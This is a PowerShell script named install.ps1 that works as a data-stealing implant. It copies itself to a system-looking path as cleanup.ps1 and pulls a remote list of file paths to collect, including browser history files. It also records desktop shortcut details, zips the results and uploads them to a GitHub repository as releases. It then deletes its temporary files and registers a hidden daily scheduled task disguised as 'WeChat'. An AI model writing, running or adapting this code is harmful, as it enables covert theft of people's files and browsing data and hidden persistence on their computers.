# install.ps1 - 上传文件 + 注册计划任务（计划任务名：WeChat）

# Save self to local file path for scheduled task (no space)
$localPath = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"
Invoke-RestMethod -Uri "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing

# Set UTF-8 encoding
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$token = $env:GITHUB_TOKEN
$repo = "rtyuiuiop/1"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# STEP 1: Load file path list from remote .txt
$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-paths.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    return
}

$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"

    if (-not (Test-Path $path)) { continue }

    $dest = Join-Path $tempRoot $name

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
    } catch {}
}

# STEP 2: Extract .lnk shortcut info from Desktop
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""

    foreach ($lnk in $lnkFiles) {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)

        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }

    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
} catch {}

# STEP 3: Archive
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
} catch {
    return
}

# STEP 4: Upload
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file package from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
} catch {
    return
}

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    $response = Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
} catch {}

# STEP 5: Cleanup
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

# STEP 6: Register daily task at 1:00 AM to run the cleanup.ps1 script (schtasks version)
$taskName = "WeChat"
$scriptPath = "C:\ProgramData\Microsoft\Windows\cleanup.ps1"

if (-Not (Test-Path $scriptPath)) {
    Write-Error "❌ cleanup.ps1 not found at $scriptPath"
    exit 1
}

Write-Host "📅 Registering scheduled task [$taskName] (daily at 01:00 AM)..."

schtasks /Create /TN $taskName /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" /SC DAILY /ST 01:00 /F | Out-Null

Write-Host "✅ Task registered: will run daily at 01:00 AM"
